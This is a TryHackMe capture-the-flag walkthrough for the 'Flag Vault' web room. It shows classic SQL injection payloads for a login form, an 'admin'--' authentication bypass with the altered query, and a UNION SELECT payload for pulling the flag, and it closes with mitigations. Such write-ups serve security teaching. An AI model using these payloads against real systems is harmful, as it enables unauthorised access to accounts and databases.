# 🏦 Flag Vault — TryHackMe Walkthrough

**Room:** [Flag Vault](https://tryhackme.com/room/flagvault)
**Difficulty:** Easy
**Category:** Web / SQL Injection
**Tags:** SQLi, SQL Injection, Authentication Bypass, Web

---

## 📋 Overview

Flag Vault is a web challenge focused on **SQL Injection** — one of the most common and dangerous web vulnerabilities. The goal is to bypass authentication or extract data from a database to retrieve the hidden flag.

---

## 🔧 Tools Used

- Browser / Burp Suite — Request interception and modification
- `sqlmap` — Automated SQL injection tool (optional)

---

## 🌐 Step 1: Explore the Application

Navigate to `http://<TARGET_IP>`. You'll find a login form or a data query interface. Test inputs manually to observe how the application responds.

---

## 🔍 Step 2: Test for SQL Injection

Try classic SQLi payloads in the username or input field:

```sql
' OR '1'='1
' OR 1=1--
admin'--
' OR 'a'='a
```

If the application returns an error or behaves unexpectedly, it is likely vulnerable to SQLi.

---

## 🔑 Step 3: Authentication Bypass

For a login form, use the classic bypass payload:

```
Username: admin'--
Password: anything
```

This comments out the password check in the SQL query:

```sql
-- Original:  SELECT * FROM users WHERE username='$user' AND password='$pass'
-- Becomes:   SELECT * FROM users WHERE username='admin'--' AND password='anything'
```

The `--` comments out the rest of the query, so only the username match matters.

---

## 🚩 Step 4: Extract the Flag

Once authenticated or able to query the database, look for the flag. If the app has a query interface, use UNION-based injection to extract data:

```sql
' UNION SELECT 1,flag,3 FROM flags--
```

Or navigate to a flag-display area after successful authentication bypass.

> 🚩 **Flag:** Retrieved via SQL injection from the database or displayed after auth bypass.

---

## 📝 Key Takeaways

- **SQL Injection** occurs when user input is concatenated directly into SQL queries without sanitisation.
- **Authentication bypass** is one of the most impactful SQLi attacks.
- Mitigations: use **parameterised queries / prepared statements**, ORMs, input validation, and least-privilege database users.
- Always test for SQLi using both manual payloads and tools like `sqlmap`.

---

## 🔗 References

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [TryHackMe — Flag Vault Room](https://tryhackme.com/room/flagvault)
- [Walkthrough Reference](https://medium.com/@sornphut/flag-vault-tryhackme-walkthough-6138ed556cf2)
